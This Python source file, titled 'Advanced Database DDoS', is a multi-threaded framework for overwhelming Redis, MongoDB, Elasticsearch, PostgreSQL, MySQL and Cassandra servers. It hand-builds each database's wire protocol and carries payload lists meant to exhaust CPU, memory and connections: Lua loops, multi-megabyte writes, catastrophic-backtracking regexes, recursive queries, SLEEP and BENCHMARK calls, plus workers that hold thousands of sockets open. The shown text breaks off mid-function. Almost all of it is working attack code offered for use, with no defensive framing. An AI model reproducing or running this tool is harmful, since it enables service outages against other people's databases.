#!/usr/bin/env python3
"""
Advanced Database DDoS
Multi-Threaded Database Exhaustion Attack Framework
Targets: Redis, MongoDB, Elasticsearch, PostgreSQL, MySQL, Cassandra, DynamoDB
"""

import socket
import ssl
import threading
import random
import time
import sys
import os
import struct
import hashlib
import hmac
import base64
import json
import queue
import signal
import traceback
import ipaddress
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, deque
from datetime import datetime, timedelta
from enum import Enum
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any, Union
import logging
from logging.handlers import RotatingFileHandler
import zlib
import gzip
from io import BytesIO

# ==================== CONFIGURATION ====================
@dataclass
class DatabaseEngineConfig:
    debug: bool = False
    log_file: str = "database_ddos.log"
    max_log_size: int = 100 * 1024 * 1024
    backup_count: int = 10
    stealth_mode: bool = False
    adaptive_mode: bool = True
    verify_ssl: bool = False
    timeout: int = 30
    retry_count: int = 3
    connection_pool_size: int = 1000
    redis_auth_password: Optional[str] = None
    mongodb_connection_string: Optional[str] = None
    elasticsearch_api_key: Optional[str] = None
    mysql_user: str = "root"
    mysql_password: Optional[str] = None
    postgres_user: str = "postgres"
    postgres_password: Optional[str] = None
    cassandra_keyspace: str = "system"
    dynamodb_region: str = "us-east-1"

config = DatabaseEngineConfig()

# ==================== LOGGING ====================
def setup_logging():
    logger = logging.getLogger('DB_DDOS')
    logger.setLevel(logging.DEBUG if config.debug else logging.INFO)
    
    formatter = logging.Formatter(
        '%(asctime)s - [%(levelname)s] - %(threadName)s - %(funcName)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    file_handler = RotatingFileHandler(
        config.log_file, 
        maxBytes=config.max_log_size,
        backupCount=config.backup_count
    )
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S'))
    
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger

logger = setup_logging()

# ==================== ENUMS ====================
class DatabaseType(Enum):
    REDIS = "redis"
    MONGODB = "mongodb"
    ELASTICSEARCH = "elasticsearch"
    POSTGRESQL = "postgresql"
    MYSQL = "mysql"
    CASSANDRA = "cassandra"
    DYNAMODB = "dynamodb"
    COUCHDB = "couchdb"
    INFLUXDB = "influxdb"
    NEO4J = "neo4j"
    RETHINKDB = "rethinkdb"
    COCKROACHDB = "cockroachdb"
    TIMESCALEDB = "timescaledb"
    MIXED = "mixed"

class AttackMethod(Enum):
    CONNECTION_FLOOD = "connection_flood"
    QUERY_FLOOD = "query_flood"
    CPU_EXHAUSTION = "cpu_exhaustion"
    MEMORY_EXHAUSTION = "memory_exhaustion"
    DISK_EXHAUSTION = "disk_exhaustion"
    CURSOR_FLOOD = "cursor_flood"
    INDEX_FLOOD = "index_flood"
    RECURSIVE_QUERY = "recursive_query"
    BATCH_OPERATION = "batch_operation"
    TRANSACTION_FLOOD = "transaction_flood"

# ==================== REDIS PROTOCOL ====================
class RedisProtocol:
    @staticmethod
    def encode_command(*args):
        """Encode Redis RESP protocol command"""
        command = f"*{len(args)}\r\n"
        for arg in args:
            command += f"${len(str(arg))}\r\n{str(arg)}\r\n"
        return command.encode()
    
    @staticmethod
    def parse_response(data):
        """Parse Redis RESP protocol response"""
        if not data:
            return None
        
        prefix = data[0:1]
        if prefix == b'+':
            return data[1:].decode().strip()
        elif prefix == b'-':
            return f"ERROR: {data[1:].decode().strip()}"
        elif prefix == b':':
            return int(data[1:].decode().strip())
        elif prefix == b'$':
            parts = data.split(b'\r\n')
            if parts[0] == b'$-1':
                return None
            return parts[1].decode()
        elif prefix == b'*':
            return "Array response"
        return data.decode()

# ==================== MONGODB PROTOCOL ====================
class MongoDBProtocol:
    @staticmethod
    def build_op_msg(document, flags=0):
        """Build MongoDB OP_MSG wire protocol message"""
        sections = []
        
        # Section 0: Body document
        if isinstance(document, str):
            document = json.loads(document)
        
        bson_doc = MongoDBProtocol._encode_bson(document)
        sections.append(b'\x00' + bson_doc)
        
        # Build header
        total_length = 16  # Header size
        for section in sections:
            total_length += len(section)
        
        header = struct.pack('<iiii', total_length, 0, 0, 2013)  # OP_MSG = 2013
        flags_bytes = struct.pack('<I', flags)
        
        return header + flags_bytes + b''.join(sections)
    
    @staticmethod
    def build_query(collection, query_doc, number_to_return=-1):
        """Build MongoDB OP_QUERY wire protocol message"""
        if isinstance(query_doc, str):
            query_doc = json.loads(query_doc)
        
        full_collection = f"admin.{collection}"
        flags = 0
        number_to_skip = 0
        
        query_bson = MongoDBProtocol._encode_bson(query_doc)
        
        header = struct.pack('<iiii', 0, 0, 0, 2004)  # OP_QUERY = 2004
        body = struct.pack('<i', flags)
        body += full_collection.encode() + b'\x00'
        body += struct.pack('<ii', number_to_skip, number_to_return)
        body += query_bson
        
        total_length = len(header) + len(body)
        header = struct.pack('<iiii', total_length, random.randint(1, 999999), 0, 2004)
        
        return header + body
    
    @staticmethod
    def _encode_bson(doc):
        """Simple BSON encoder"""
        elements = b''
        
        for key, value in doc.items():
            if isinstance(value, str):
                elements += b'\x02' + key.encode() + b'\x00'
                elements += struct.pack('<i', len(value) + 1) + value.encode() + b'\x00'
            elif isinstance(value, int):
                if value <= 2147483647 and value >= -2147483648:
                    elements += b'\x10' + key.encode() + b'\x00'
                    elements += struct.pack('<i', value)
                else:
                    elements += b'\x12' + key.encode() + b'\x00'
                    elements += struct.pack('<q', value)
            elif isinstance(value, float):
                elements += b'\x01' + key.encode() + b'\x00'
                elements += struct.pack('<d', value)
            elif isinstance(value, bool):
                elements += b'\x08' + key.encode() + b'\x00'
                elements += b'\x01' if value else b'\x00'
            elif isinstance(value, dict):
                elements += b'\x03' + key.encode() + b'\x00'
                sub_doc = MongoDBProtocol._encode_bson(value)
                elements += struct.pack('<i', len(sub_doc) + 5) + sub_doc
            elif isinstance(value, list):
                elements += b'\x04' + key.encode() + b'\x00'
                array_doc = {}
                for i, item in enumerate(value):
                    array_doc[str(i)] = item
                sub_doc = MongoDBProtocol._encode_bson(array_doc)
                elements += struct.pack('<i', len(sub_doc) + 5) + sub_doc
            elif value is None:
                elements += b'\x0A' + key.encode() + b'\x00'
        
        total_size = len(elements) + 5
        result = struct.pack('<i', total_size) + elements + b'\x00'
        return result

# ==================== DATABASE PAYLOAD DATABASE ====================
class DatabasePayloadDatabase:
    def __init__(self):
        self._init_redis_commands()
        self._init_mongodb_queries()
        self._init_elasticsearch_queries()
        self._init_postgresql_queries()
        self._init_mysql_queries()
        self._init_cassandra_queries()
    
    def _init_redis_commands(self):
        self.redis_basic_commands = [
            ("PING",),
            ("INFO",),
            ("CONFIG", "GET", "*"),
            ("CLIENT", "LIST"),
            ("SLOWLOG", "GET", "1000"),
            ("DBSIZE",),
            ("KEYS", "*"),
            ("SCAN", "0", "MATCH", "*", "COUNT", "10000"),
            ("RANDOMKEY",),
            ("DEBUG", "OBJECT", "*"),
            ("MEMORY", "STATS"),
            ("MEMORY", "DOCTOR"),
            ("COMMAND", "INFO"),
            ("MODULE", "LIST"),
        ]
        
        self.redis_cpu_commands = [
            # Sort large datasets
            ("SORT", "large_key", "BY", "nosort", "GET", "#", "GET", "#", "GET", "#", "GET", "#", "GET", "#"),
            # Complex ZSET operations
            ("ZUNIONSTORE", "dest", "10", "key1", "key2", "key3", "WEIGHTS", "1", "2", "3", "AGGREGATE", "SUM"),
            ("ZINTERSTORE", "dest", "10", "key1", "key2", "key3", "WEIGHTS", "1", "2", "3"),
            # Lua script execution
            ("EVAL", "local s = '' for i=1,1000000 do s = s .. tostring(i) end return s", "0"),
            ("EVAL", "local t = {} for i=1,100000 do t[i] = redis.call('GET', KEYS[1]) end return #t", "0"),
            # SORT with ALPHA
            ("SORT", "key", "ALPHA", "LIMIT", "0", "999999"),
        ]
        
        self.redis_memory_commands = [
            # Create large values
            ("SET", "large_key_{random}", "X" * 1048576),  # 1MB value
            ("SETEX", "temp_key_{random}", "3600", "X" * 10485760),  # 10MB with expiry
            ("APPEND", "growing_key_{random}", "X" * 1048576),
            # Hash flood
            ("HSET", "hash_{random}", "field_{random}", "X" * 102400),
            # List flood
            ("LPUSH", "list_{random}", *["X" * 10240 for _ in range(100)]),
            # Set flood
            ("SADD", "set_{random}", *[str(i) for i in range(10000)]),
            # Sorted set flood
            ("ZADD", "zset_{random}", *[f"{i}" for i in range(1000) for _ in range(2)]),
        ]
    
    def _init_mongodb_queries(self):
        self.mongodb_queries = [
            # Collection scan
            '{"find": "users", "filter": {}}',
            '{"find": "users", "filter": {"$where": "sleep(1000)"}}',
            # Aggregation pipeline (CPU heavy)
            '{"aggregate": "users", "pipeline": [{"$group": {"_id": "$field", "count": {"$sum": 1}}}, {"$sort": {"count": -1}}, {"$unwind": "$array"}, {"$lookup": {"from": "other", "localField": "_id", "foreignField": "_id", "as": "joined"}}, {"$unwind": "$joined"}, {"$group": {"_id": "$joined.field", "count": {"$sum": 1}}}]}',
            # MapReduce
            '{"mapReduce": "users", "map": "function() { for(var i=0; i<10000; i++) emit(this._id, 1); }", "reduce": "function(k, vals) { return Array.sum(vals); }", "out": "mr_results"}',
            # Text search
            '{"find": "users", "filter": {"$text": {"$search": "aaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}}',
            # Regex DOS
            '{"find": "users", "filter": {"field": {"$regex": "(a+)+b", "$options": "i"}}}',
            # Large result set
            '{"find": "users", "filter": {}, "batchSize": 100000}',
        ]
        
        self.mongodb_admin_commands = [
            # Server status
            '{"serverStatus": 1}',
            '{"currentOp": 1}',
            '{"listDatabases": 1}',
            '{"listCollections": 1}',
            # Profiling
            '{"profile": 2}',
            # Diagnostic
            '{"dbStats": 1, "scale": 1024}',
            '{"collStats": "users"}',
        ]
    
    def _init_elasticsearch_queries(self):
        self.elasticsearch_queries = [
            # Deep pagination
            '{"query": {"match_all": {}}, "from": 10000, "size": 10000}',
            # Wildcard query
            '{"query": {"wildcard": {"field": {"value": "*a*b*c*d*e*f*g*h*i*j*"}}}}',
            # Fuzzy query
            '{"query": {"fuzzy": {"field": {"value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaa", "fuzziness": "AUTO"}}}}',
            # Regexp query
            '{"query": {"regexp": {"field": {"value": ".*(a+)+b.*"}}}}',
            # Script query
            '{"query": {"bool": {"must": [{"script": {"script": {"source": "long sum = 0; for (int i = 0; i < 10000000; i++) { sum += i; } return sum;", "lang": "painless"}}}]}}}',
            # Aggregation
            '{"aggs": {"large_agg": {"terms": {"field": "field", "size": 1000000}}}}',
            # Complex aggregation
            '{"size": 0, "aggs": {"a": {"terms": {"field": "f1", "size": 100000}, "aggs": {"b": {"terms": {"field": "f2", "size": 100000}, "aggs": {"c": {"terms": {"field": "f3", "size": 100000}}}}}}}}',
            # Highlight on all fields
            '{"query": {"match": {"_all": "a"}}, "highlight": {"fields": {"*": {}}}}',
            # Rescore
            '{"query": {"match_all": {}}, "rescore": {"window_size": 10000, "query": {"rescore_query": {"match": {"_all": "a"}}, "query_weight": 0.7, "rescore_query_weight": 1.2}}}',
        ]
        
        self.elasticsearch_index_commands = [
            # Create index with many fields
            '{"settings": {"number_of_shards": 100, "number_of_replicas": 10}, "mappings": {"properties": {' + ','.join([f'"field_{i}": {{"type": "text"}}' for i in range(100)]) + '}}}',
            # Force merge
            '{"force_merge": {"max_num_segments": 1}}',
            # Refresh
            '{"refresh": {}}',
            # Flush
            '{"flush": {}}',
        ]
    
    def _init_postgresql_queries(self):
        self.postgresql_queries = [
            # Recursive CTE (CPU exhaustion)
            "WITH RECURSIVE r(i) AS (SELECT 1 UNION ALL SELECT i+1 FROM r WHERE i < 10000000) SELECT count(*) FROM r",
            # Generate series with cross join
            "SELECT count(*) FROM generate_series(1, 1000000) a CROSS JOIN generate_series(1, 100) b",
            # Complex window function
            "SELECT *, row_number() OVER (PARTITION BY id ORDER BY created_at), rank() OVER (ORDER BY score DESC), dense_rank() OVER (ORDER BY score DESC), lag(value, 1) OVER (ORDER BY id), lead(value, 1) OVER (ORDER BY id) FROM users CROSS JOIN generate_series(1, 1000)",
            # Full text search
            "SELECT * FROM users WHERE to_tsvector('english', description) @@ to_tsquery('english', 'a & b & c & d & e & f & g & h & i & j')",
            # Regex match
            "SELECT * FROM users WHERE description ~ '.*(a+)+b.*'",
            # Large sort
            "SELECT * FROM users ORDER BY random() LIMIT 1000000",
            # Nested subquery
            "SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM users) a) b) c) d CROSS JOIN generate_series(1, 10000) e",
            # Array operations
            "SELECT array_agg(id), array_agg(name) FROM users CROSS JOIN generate_series(1, 10000) GROUP BY generate_series",
        ]
        
        self.postgresql_admin_queries = [
            # Stats collector
            "SELECT * FROM pg_stat_activity",
            "SELECT * FROM pg_stat_statements",
            "SELECT * FROM pg_stat_user_tables",
            "SELECT * FROM pg_stat_bgwriter",
            # System catalog queries
            "SELECT * FROM pg_class CROSS JOIN pg_attribute",
            "SELECT * FROM information_schema.columns CROSS JOIN information_schema.tables",
            # Large object operations
            "SELECT lo_create(0)",
            "SELECT lo_import('/dev/urandom')",
        ]
    
    def _init_mysql_queries(self):
        self.mysql_queries = [
            # BENCHMARK (CPU exhaustion)
            "SELECT BENCHMARK(10000000, MD5('test'))",
            "SELECT BENCHMARK(10000000, ENCODE('test', 'key'))",
            "SELECT BENCHMARK(10000000, AES_ENCRYPT('test', 'key'))",
            # Sleep
            "SELECT SLEEP(100)",
            # Complex joins
            "SELECT * FROM information_schema.columns a CROSS JOIN information_schema.columns b CROSS JOIN information_schema.columns c",
            # Regex
            "SELECT * FROM users WHERE description REGEXP '(a+)+b'",
            # Stored procedure call
            "CALL heavy_procedure()",
            # Large transaction
            "START TRANSACTION; SELECT * FROM users FOR UPDATE; DO SLEEP(100); COMMIT",
            # Temporary table
            "CREATE TEMPORARY TABLE temp_large AS SELECT * FROM information_schema.columns CROSS JOIN information_schema.tables",
        ]
        
        self.mysql_admin_queries = [
            "SHOW FULL PROCESSLIST",
            "SHOW ENGINE INNODB STATUS",
            "SHOW GLOBAL STATUS",
            "SHOW GLOBAL VARIABLES",
            "SELECT * FROM performance_schema.events_statements_summary_by_digest",
            "SELECT * FROM sys.schema_tables_with_full_table_scans",
        ]
    
    def _init_cassandra_queries(self):
        self.cassandra_cql_queries = [
            # Full table scan
            "SELECT * FROM users",
            # Allow filtering (forces full scan)
            "SELECT * FROM users WHERE non_indexed_field = 'value' ALLOW FILTERING",
            # IN clause with many values
            f"SELECT * FROM users WHERE id IN ({','.join([str(i) for i in range(10000)])})",
            # Large batch
            "BEGIN BATCH " + " ".join([f"INSERT INTO users (id, name) VALUES ({i}, 'name{i}');" for i in range(100)]) + " APPLY BATCH",
            # Complex materialized view
            "SELECT * FROM users_by_name WHERE name LIKE '%a%'",
        ]
    
    def random_string(self, length=10):
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

# ==================== DATABASE CONNECTION MANAGER ====================
class DatabaseConnectionManager:
    def __init__(self, host, port, pool_size=100):
        self.host = host
        self.port = port
        self.pool_size = pool_size
        self.pool = queue.Queue(maxsize=pool_size)
        self.lock = threading.Lock()
        self.created = 0
        
    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.settimeout(config.timeout)
            sock.connect((self.host, self.port))
            
            with self.lock:
                self.created += 1
            
            return sock
        except Exception as e:
            logger.debug(f"DB connection creation failed: {e}")
            return None
    
    def get_connection(self):
        try:
            return self.pool.get_nowait()
        except queue.Empty:
            if self.created < self.pool_size:
                return self.create_connection()
            return None
    
    def return_connection(self, conn):
        if conn:
            try:
                self.pool.put_nowait(conn)
            except queue.Full:
                try:
                    conn.close()
                except:
                    pass
                with self.lock:
                    self.created -= 1
    
    def close_all(self):
        while not self.pool.empty():
            try:
                conn = self.pool.get_nowait()
                conn.close()
            except:
                pass

# ==================== STATISTICS ====================
class DatabaseStatistics:
    def __init__(self):
        self.stats = defaultdict(int)
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.response_times = deque(maxlen=10000)
        self.db_type_stats = defaultdict(int)
        self.attack_method_stats = defaultdict(int)
        
    def record_success(self, db_type, attack_method, response_time=None):
        with self.lock:
            self.stats['total_success'] += 1
            self.stats[f'{db_type}_success'] += 1
            self.db_type_stats[db_type] += 1
            self.attack_method_stats[attack_method] += 1
            if response_time:
                self.response_times.append(response_time)
    
    def record_failure(self, db_type, error_type):
        with self.lock:
            self.stats['total_failure'] += 1
            self.stats[f'{db_type}_failure'] += 1
            self.stats[f'error_{error_type}'] += 1
    
    def record_connection(self, db_type):
        with self.lock:
            self.stats['active_connections'] += 1
            self.stats[f'{db_type}_connections'] += 1
    
    def record_disconnection(self, db_type):
        with self.lock:
            self.stats['active_connections'] -= 1
            self.stats[f'{db_type}_connections'] -= 1
    
    def get_summary(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            total = self.stats['total_success'] + self.stats['total_failure']
            rate = total / elapsed if elapsed > 0 else 0
            
            avg_rt = 0
            if self.response_times:
                avg_rt = sum(self.response_times) / len(self.response_times)
            
            return {
                'elapsed': elapsed,
                'total_operations': total,
                'successful': self.stats['total_success'],
                'failed': self.stats['total_failure'],
                'rate': rate,
                'avg_response_time': avg_rt,
                'active_connections': self.stats['active_connections'],
                'db_type_stats': dict(self.db_type_stats),
                'attack_method_stats': dict(self.attack_method_stats)
            }

# ==================== DATABASE ATTACK EXECUTOR ====================
class DatabaseAttackExecutor:
    def __init__(self, target, port, db_type=DatabaseType.REDIS, threads=500, duration=60):
        self.target = target
        self.port = port
        self.db_type = db_type
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = DatabaseStatistics()
        self.connection_pool = DatabaseConnectionManager(target, port, pool_size=threads)
        self.payload_db = DatabasePayloadDatabase()
        self.redis_auth = config.redis_auth_password
        
    def _test_target(self):
        logger.info(f"[*] Testing {self.db_type.value} connection: {self.target}:{self.port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            
            if result == 0:
                logger.info(f"[+] Target reachable on port {self.port}")
                
                # Test database-specific protocol
                if self.db_type == DatabaseType.REDIS:
                    sock.send(RedisProtocol.encode_command("PING"))
                    response = sock.recv(4096)
                    logger.info(f"[+] Redis response: {RedisProtocol.parse_response(response)}")
                elif self.db_type == DatabaseType.MONGODB:
                    doc = MongoDBProtocol._encode_bson({"isMaster": 1})
                    msg = MongoDBProtocol.build_query("admin.$cmd", {"isMaster": 1}, -1)
                    sock.send(msg)
                    response = sock.recv(4096)
                    logger.info(f"[+] MongoDB responded ({len(response)} bytes)")
                elif self.db_type == DatabaseType.ELASTICSEARCH:
                    request = b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
                    sock.send(request)
                    response = sock.recv(4096)
                    logger.info(f"[+] Elasticsearch responded")
                
                sock.close()
                return True
            else:
                logger.error(f"[-] Target NOT reachable (error: {result})")
                return False
        except Exception as e:
            logger.error(f"[-] Connection test failed: {e}")
            return False
    
    def _redis_flood_worker(self, thread_id):
        consecutive_errors = 0
        max_errors = 50
        
        # Try authentication first
        authenticated = True
        if self.redis_auth:
            try:
                sock = self.connection_pool.get_connection()
                if not sock:
                    sock = self.connection_pool.create_connection()
                if sock:
                    sock.send(RedisProtocol.encode_command("AUTH", self.redis_auth))
                    response = sock.recv(4096)
                    if b"OK" not in response and b"+OK" not in response:
                        logger.error(f"[-] Redis authentication failed")
                        authenticated = False
                    self.connection_pool.return_connection(sock)
            except:
                authenticated = False
        
        if not authenticated and self.redis_auth:
            return
        
        while self.running and consecutive_errors < max_errors:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                if self.redis_auth:
                    conn.send(RedisProtocol.encode_command("AUTH", self.redis_auth))
                    conn.recv(4096)
                
                # Execute multiple commands per connection
                for _ in range(random.randint(1, 50)):
                    if not self.running:
                        break
                    
                    # Mix of different attack types
                    attack_type = random.choice(['basic', 'cpu', 'memory', 'connection'])
                    
                    if attack_type == 'basic':
                        command = random.choice(self.payload_db.redis_basic_commands)
                    elif attack_type == 'cpu':
                        command = random.choice(self.payload_db.redis_cpu_commands)
                        # Replace placeholders
                        command = tuple(
                            str(c).replace('{random}', self.payload_db.random_string(8))
                            for c in command
                        )
                    elif attack_type == 'memory':
                        command = random.choice(self.payload_db.redis_memory_commands)
                        command = tuple(
                            str(c).replace('{random}', self.payload_db.random_string(8))
                            for c in command
                        )
                    else:
                        # Connection flood - just open new connections
                        for _ in range(10):
                            new_conn = self.connection_pool.create_connection()
                            if new_conn:
                                if self.redis_auth:
                                    new_conn.send(RedisProtocol.encode_command("AUTH", self.redis_auth))
                                    new_conn.recv(4096)
                                new_conn.send(RedisProtocol.encode_command("CLIENT", "SETNAME", f"attacker_{thread_id}_{random.randint(1,9999)}"))
                                self.stats.record_connection('redis')
                                # Don't return to pool - hold connection open
                    
                    if attack_type != 'connection':
                        try:
                            conn.settimeout(10)
                            start = time.time()
                            conn.send(RedisProtocol.encode_command(*command))
                            response = conn.recv(4096)
                            rt = time.time() - start
                            
                            self.stats.record_success('redis', attack_type, rt)
                            consecutive_errors = 0
                        except socket.timeout:
                            self.stats.record_success('redis', attack_type)
                            consecutive_errors = 0
                        except Exception:
                            self.stats.record_failure('redis', 'send_error')
                            consecutive_errors += 1
                            break
                
                if attack_type != 'connection':
                    self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('redis', type(e).__name__)
                time.sleep(random.uniform(0.001, 0.1))
    
    def _mongodb_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                attack_type = random.choice(['query', 'admin', 'connection'])
                
                if attack_type == 'query':
                    query_str = random.choice(self.payload_db.mongodb_queries)
                    msg = MongoDBProtocol.build_query("test." + self.payload_db.random_string(8), query_str)
                elif attack_type == 'admin':
                    query_str = random.choice(self.payload_db.mongodb_admin_commands)
                    msg = MongoDBProtocol.build_query("admin.$cmd", query_str)
                else:
                    # Connection flood
                    msg = MongoDBProtocol.build_query("admin.$cmd", '{"isMaster": 1}')
                
                try:
                    start = time.time()
                    conn.send(msg)
                    conn.settimeout(10)
                    response = conn.recv(4096)
                    rt = time.time() - start
                    
                    self.stats.record_success('mongodb', attack_type, rt)
                    consecutive_errors = 0
                except socket.timeout:
                    self.stats.record_success('mongodb', attack_type)
                    consecutive_errors = 0
                except Exception:
                    self.stats.record_failure('mongodb', 'protocol_error')
                    consecutive_errors += 1
                
                if attack_type != 'connection':
                    self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('mongodb', type(e).__name__)
                time.sleep(0.01)
    
    def _elasticsearch_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                attack_type = random.choice(['query', 'index', 'connection'])
                
                if attack_type == 'query':
                    payload = random.choice(self.payload_db.elasticsearch_queries)
                    path = f"/_search"
                    method = "POST"
                elif attack_type == 'index':
                    payload = random.choice(self.payload_db.elasticsearch_index_commands)
                    path = f"/test_index_{self.payload_db.random_string(8)}"
                    method = "PUT" if "mappings" in payload else "POST"
                else:
                    payload = '{"query": {"match_all": {}}}'
                    path = "/_search"
                    method = "GET"
                
                request = (
                    f"{method} {path} HTTP/1.1\r\n"
                    f"Host: {self.target}:{self.port}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(payload)}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                    f"{payload}"
                ).encode()
                
                try:
                    start = time.time()
                    conn.send(request)
                    conn.settimeout(30)
                    response = conn.recv(4096)
                    rt = time.time() - start
                    
                    self.stats.record_success('elasticsearch', attack_type, rt)
                    consecutive_errors = 0
                except socket.timeout:
                    self.stats.record_success('elasticsearch', attack_type)
                    consecutive_errors = 0
                except Exception:
                    self.stats.record_failure('elasticsearch', 'http_error')
                    consecutive_errors += 1
                
                if attack_type != 'connection':
                    self.connection_pool.return_connection(conn)
                else:
                    # Hold connection open
                    self.stats.record_connection('elasticsearch')
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('elasticsearch', type(e).__name__)
                time.sleep(0.01)
    
    def _postgresql_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                # Build simple PostgreSQL query message
                query = random.choice(
                    self.payload_db.postgresql_queries + 
                    self.payload_db.postgresql_admin_queries
                )
                
                # PostgreSQL wire protocol - Simple Query
                query_bytes = query.encode()
                length = len(query_bytes) + 4
                packet = b'Q' + struct.pack('>i', length) + query_bytes + b'\x00'
                
                try:
                    start = time.time()
                    conn.send(packet)
                    conn.settimeout(30)
                    response = conn.recv(4096)
                    rt = time.time() - start
                    
                    self.stats.record_success('postgresql', 'query', rt)
                    consecutive_errors = 0
                except socket.timeout:
                    self.stats.record_success('postgresql', 'query')
                    consecutive_errors = 0
                except Exception:
                    self.stats.record_failure('postgresql', 'query_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('postgresql', type(e).__name__)
                time.sleep(0.01)
    
    def _mysql_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                # Read MySQL handshake
                try:
                    conn.settimeout(5)
                    handshake = conn.recv(4096)
                except:
                    pass
                
                query = random.choice(
                    self.payload_db.mysql_queries +
                    self.payload_db.mysql_admin_queries
                )
                
                # MySQL simple query packet
                query_bytes = query.encode()
                packet = struct.pack('<I', len(query_bytes))[:3] + b'\x03' + query_bytes
                
                try:
                    start = time.time()
                    conn.send(packet)
                    conn.settimeout(30)
                    response = conn.recv(4096)
                    rt = time.time() - start
                    
                    self.stats.record_success('mysql', 'query', rt)
                    consecutive_errors = 0
                except socket.timeout:
                    self.stats.record_success('mysql', 'query')
                    consecutive_errors = 0
                except Exception:
                    self.stats.record_failure('mysql', 'query_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('mysql', type(e).__name__)
                time.sleep(0.01)
    
    def _cassandra_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                query = random.choice(self.payload_db.cassandra_cql_queries)
                
                # CQL binary protocol - QUERY opcode (0x07)
                stream_id = random.randint(0, 32767)
                query_bytes = query.encode()
                
                header = struct.pack('>BB', 0x04, 0x00)  # Version 4, Request
                header += struct.pack('>B', 0x00)  # Flags
                header += struct.pack('>h', stream_id)
                header += struct.pack('>B', 0x07)  # Opcode QUERY
                header += struct.pack('>i', len(query_bytes))
                header += query_bytes
                
                # Consistency level ONE
                header += struct.pack('>h', 0x0001)
                
                # Frame header
                frame = struct.pack('>i', len(header)) + header
                
                try:
                    start = time.time()
                    conn.send(frame)
                    conn.settimeout(30)
                    response = conn.recv(4096)
                    rt = time.time() - start
                    
                    self.stats.record_success('cassandra', 'query', rt)
                    consecutive_errors = 0
                except socket.timeout:
                    self.stats.record_success('cassandra', 'query')
                    consecutive_errors = 0
                except Exception:
                    self.stats.record_failure('cassandra', 'query_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('cassandra', type(e).__name__)
                time.sleep(0.01)
    
    def _connection_flood_worker(self, thread_id):
        """Generic connection flood - opens connections and holds them"""
        connections = []
        max_connections = 1000
        
        while self.running and len(connections) < max_connections:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(30)
                sock.connect((self.target, self.port))
                
                connections.append(sock)
                self.stats.record_connection(self.db_type.value)
                self.stats.record_success(self.db_type.value, 'connection')
                
                # Send keep-alive or initial handshake
                if self.db_type == DatabaseType.REDIS:
                    sock.send(RedisProtocol.encode_command("PING"))
                elif self.db_type == DatabaseType.MONGODB:
                    sock.send(MongoDBProtocol.build_query("admin.$cmd", '{"isMaster": 1}'))
                
                time.sleep(random.uniform(0.001, 0.01))
                
            except Exception as e:
                self.stats.record_failure(self.db_type.value, type(e).__name__)
                if len(connections) >= max_connections:
                    break
        
        # Hold connections
        while self.running:
            for sock in list(connections):
                try:
                    sock.send(b'\x00')
                except:
                    connections.remove(sock)
                    self.stats.record_disconnection(self.db_type.value)
            
            time.sleep(5)
        
        # Cleanup
